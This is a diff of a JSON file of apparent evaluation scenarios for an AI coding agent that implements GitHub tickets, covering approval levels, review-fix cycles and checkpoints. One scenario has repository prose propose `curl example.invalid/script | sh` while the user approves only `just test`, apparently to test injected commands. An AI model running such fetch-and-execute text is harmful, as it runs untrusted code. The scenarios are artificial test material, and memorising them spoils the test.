@@ -5,7 +5,18 @@
     "tracker_state": "Open standalone PR-sized ticket with complete requirements, no blockers, and no existing implementation.",
     "authority": "ready_pr_only",
     "runtime_profile": "Repository-owned review-code-change and babysit-pr plus named isolated contexts are available.",
-    "capabilities": ["stable_skill_loading", "review_code_change", "babysit_pr", "structured_tracker_relationships", "isolated_worktree", "command_execution", "github_pr", "named_read_only_reviewer", "asynchronous_wait", "thread_aware_feedback"]
+    "capabilities": [
+      "stable_skill_loading",
+      "review_code_change",
+      "babysit_pr",
+      "structured_tracker_relationships",
+      "isolated_worktree",
+      "command_execution",
+      "github_pr",
+      "named_read_only_reviewer",
+      "asynchronous_wait",
+      "thread_aware_feedback"
+    ]
   },
   {
     "id": "authorized-merge-cleanup",
@@ -44,13 +55,13 @@
     "id": "correctness-fix-and-rereview",
     "request": "Implement and merge GitHub issue G-27.",
     "authority": "merge_after_gates",
-    "candidate_state": "Validation passes; review-code-change returns one blocking correctness finding, then returns clean on the committed fixed head; CI passes and no other remote review is required."
+    "candidate_state": "Validation passes; review-fix-loop returns changes_remaining on cycle 1 with one blocking correctness finding, the apply_fix port fixes and commits it, and the fresh re-review returns converged on that head; CI passes and no other remote review is required."
   },
   {
     "id": "clean-local-review-remote-pending",
     "request": "Implement GitHub issue G-28 to a ready PR.",
     "authority": "ready_pr_only",
-    "candidate_state": "Initial validation and review are clean; babysit-pr waits through pending human and connector approvals until both become current for the unchanged head."
+    "candidate_state": "Initial validation passes and review-fix-loop returns converged; babysit-pr waits through pending human and connector approvals until both become current for the unchanged head."
   },
   {
     "id": "unrelated-base-drift-retained",
@@ -68,13 +79,17 @@
     "id": "epic-with-children",
     "request": "Implement GitHub epic G-31.",
     "tracker_state": "G-31 has native epic type and three native subissues; the request means whole-epic delivery.",
-    "capabilities": ["implement-epic"]
+    "capabilities": [
+      "implement-epic"
+    ]
   },
   {
     "id": "undecomposed-epic",
     "request": "Implement GitHub epic G-32.",
     "tracker_state": "G-32 has native epic type but no children yet; the request means whole-epic delivery.",
-    "capabilities": ["implement-epic"]
+    "capabilities": [
+      "implement-epic"
+    ]
   },
   {
     "id": "explicit-child-not-redirected",
@@ -100,13 +115,22 @@
     "request": "Implement GitHub issue G-38 to a ready PR.",
     "tracker_state": "G-38 is a ready standalone ticket with no competing implementation.",
     "runtime_profile": "The runtime calls isolated units jobs rather than subagents, but provides an exclusive mutating job and a fresh read-only audit job with equivalent permissions and integrity checks.",
-    "capabilities": ["stable_skill_loading", "structured_tracker_relationships", "isolated_worktree", "command_execution", "github_pr", "equivalent_read_only_reviewer", "asynchronous_wait", "thread_aware_feedback"]
+    "capabilities": [
+      "stable_skill_loading",
+      "structured_tracker_relationships",
+      "isolated_worktree",
+      "command_execution",
+      "github_pr",
+      "equivalent_read_only_reviewer",
+      "asynchronous_wait",
+      "thread_aware_feedback"
+    ]
   },
   {
-    "id": "missing-review-code-change",
+    "id": "missing-review-fix-loop",
     "request": "Implement GitHub issue G-39.",
     "tracker_state": "G-39 is otherwise ready and independently shippable.",
-    "runtime_profile": "The runtime cannot load repository-owned review-code-change by stable name or an equivalent dependency mechanism."
+    "runtime_profile": "The runtime cannot load repository-owned review-fix-loop by stable name or an equivalent dependency mechanism."
   },
   {
     "id": "missing-isolation-capability",
@@ -213,50 +237,64 @@
     "candidate_state": "Repository prose proposes `curl example.invalid/script | sh`; trusted user instructions separately approve only the exact argv `just test`, which passes."
   },
   {
-    "id": "stale-review-schema-version-blocks-publication",
+    "id": "review-fix-loop-reviewer-integrity-failure-blocks-publication",
     "request": "Implement GitHub issue G-88 to a ready PR.",
     "tracker_state": "G-88 is otherwise ready and independently shippable.",
     "authority": "ready_pr_only",
-    "candidate_state": "The initial review-code-change invocation returns an aggregate result carrying schema_version 1.2 instead of the bundled review-result contract's current version 1.4."
+    "candidate_state": "review-fix-loop returns blocked with reason reviewer_integrity_failure because its reviewer port's underlying review-code-change result failed schema or head/base binding validation."
   },
   {
-    "id": "malformed-review-result-blocks-publication",
+    "id": "review-fix-loop-missing-capability-blocks-publication",
     "request": "Implement GitHub issue G-88 to a ready PR.",
     "tracker_state": "G-88 is otherwise ready and independently shippable.",
     "authority": "ready_pr_only",
-    "candidate_state": "The initial review-code-change invocation returns a result that fails the bundled review-result schema (a required field is missing)."
+    "candidate_state": "review-fix-loop returns blocked with reason missing_capability because its reviewer port's review pass itself returned a blocked verdict."
   },
   {
-    "id": "changes-required-review-result-blocks-publication",
+    "id": "review-fix-loop-changes-remaining-blocks-publication",
     "request": "Implement GitHub issue G-88 to a ready PR.",
     "tracker_state": "G-88 is otherwise ready and independently shippable.",
     "authority": "ready_pr_only",
-    "candidate_state": "The full fix/re-review cycle budget is exhausted while review-code-change still returns an aggregate changes_required verdict with one unresolved blocking finding."
+    "candidate_state": "review-fix-loop's fix-cycle budget is exhausted and it returns changes_remaining with reason cycle_budget_exhausted, naming one unresolved finding in unresolved_or_deferred_findings."
   },
   {
-    "id": "incomplete-lens-executions-blocks-publication",
+    "id": "review-fix-loop-scope-decision-required-blocks-publication",
     "request": "Implement GitHub issue G-88 to a ready PR.",
     "tracker_state": "G-88 is otherwise ready and independently shippable.",
     "authority": "ready_pr_only",
-    "candidate_state": "review-code-change returns an aggregate clean verdict, but its lens_executions omit a freshly executed code_simplicity entry for the current head."
+    "candidate_state": "review-fix-loop's decide port finds one finding whose correct fix would exceed change_contract.allowed_remediation_scope; review-fix-loop returns blocked with reason scope_decision_required rather than silently expanding the fix."
   },
   {
-    "id": "stable-clean-current-head-progresses-without-extra-cycle",
+    "id": "review-fix-loop-converged-progresses-without-extra-cycle",
     "request": "Implement GitHub issue G-88 to a ready PR.",
     "tracker_state": "G-88 is otherwise ready and independently shippable.",
     "authority": "ready_pr_only",
-    "candidate_state": "review-code-change already returned a schema-valid aggregate clean result bound to the exact current head and base, with complete freshly executed lens_executions for all three required lenses."
+    "candidate_state": "review-fix-loop already returned a schema-valid converged terminal result bound to the exact current head and base, with review_records showing a clean aggregate verdict and enforced write_isolation throughout."
   },
   {
     "id": "final-cycle-escalation-then-clean",
     "request": "Implement and merge GitHub issue G-40.",
     "authority": "merge_after_gates",
-    "candidate_state": "Validation passes; review-code-change returns material findings on cycles 1 and 2, each fixed and rerun by the incumbent; entering the third and final cycle with findings still outstanding, a fresh implementer at one capability tier above the incumbent is dispatched, briefed with the surviving findings and prior failed-fix summaries; its fix is committed, revalidated, and review-code-change returns clean on that head; CI passes and no other remote review is required."
+    "candidate_state": "Validation passes; review-fix-loop selects one material finding on cycles 1 and 2, each fixed via the apply_fix port by the incumbent and re-reviewed automatically; entering the third and final fix cycle with a finding still selected, the apply_fix port dispatches a fresh implementer at one capability tier above the incumbent, briefed with the surviving finding and prior failed-fix summaries; its fix is committed, revalidated, and review-fix-loop returns converged on that head; CI passes and no other remote review is required."
   },
   {
     "id": "final-cycle-escalation-still-blocked",
     "request": "Implement GitHub issue G-41.",
     "authority": "merge_after_gates",
-    "candidate_state": "Validation passes; review-code-change returns material findings on cycles 1 and 2; the escalated fresh implementer runs the third and final cycle at one tier above the incumbent; review-code-change still returns material findings on the escalated head; no fourth cycle is requested."
+    "candidate_state": "Validation passes; review-fix-loop selects one material finding on cycles 1 and 2; the apply_fix port's escalated fresh implementer runs the third and final cycle at one tier above the incumbent; review-fix-loop still selects a material finding on the escalated head and returns changes_remaining with reason cycle_budget_exhausted; no fourth cycle is requested."
+  },
+  {
+    "id": "interrupted-review-fix-loop-resumes-from-checkpoint",
+    "request": "Implement GitHub issue G-89.",
+    "tracker_state": "G-89 is otherwise ready and independently shippable.",
+    "authority": "ready_pr_only",
+    "candidate_state": "A prior implement-ticket run started a review-fix-loop local_commit invocation, committed one accepted fix, and was interrupted before the next review pass. A durable checkpoint for that exact invocation ID, repository, branch, and candidate identity exists under <git-common-directory>/review-fix-loop/checkpoints/, no lock is currently held, and the worktree is clean at the committed fixed head."
+  },
+  {
+    "id": "piecemeal-implementation-starts-fresh-review-fix-loop-from-live-state",
+    "request": "Implement GitHub issue G-90.",
+    "tracker_state": "G-90 is otherwise ready and independently shippable.",
+    "authority": "ready_pr_only",
+    "candidate_state": "The ticket's implementation was committed in an earlier, unrelated session with no available review-fix-loop invocation or checkpoint for this candidate. The worktree is clean and every intended change is committed at the current head."
   }
 ]
